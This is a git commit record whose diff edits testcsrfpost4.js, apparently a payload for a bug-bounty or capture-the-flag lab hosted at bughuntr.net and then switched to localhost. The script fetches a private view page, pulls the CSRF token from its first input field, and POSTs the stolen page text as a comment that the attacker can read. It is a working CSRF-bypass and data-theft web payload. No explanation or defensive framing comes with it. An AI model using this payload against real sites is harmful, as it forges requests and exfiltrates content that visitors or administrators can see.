133162ed792f978dc97b6ade76d253d0d38aeef2
/hello <czavaleta93@gmail.com>
2021-11-03 19:43:46 -0500

    Update and rename testcsrfpost3.js to testcsrfpost4.js

--- testcsrfpost4.js
+++ testcsrfpost4.js
@@ -1,4 +1,4 @@
-fetch("https://unknowncontainer.br2.bughuntr.net/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
+fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
 	return res.text();
 }).then(data => {
 	var csrf = document.getElementsByTagName("input")[0].value;
@@ -8,7 +8,7 @@ fetch("https://unknowncontainer.br2.bughuntr.net/view/c8011b4f-0f8d-48b1-8195-c3
 	formData.append("creator", "fromBot");
 	formData.append("body", data);
 
-	fetch("https://unknowncontainer.br2.bughuntr.net/comment/2b0fb296-f13b-489a-b533-0ca434654d45",{
+	fetch("http://127.0.0.1:9000/view/comment/2b0fb296-f13b-489a-b533-0ca434654d45",{
 		method: 'POST',
 		body: formData
 	});
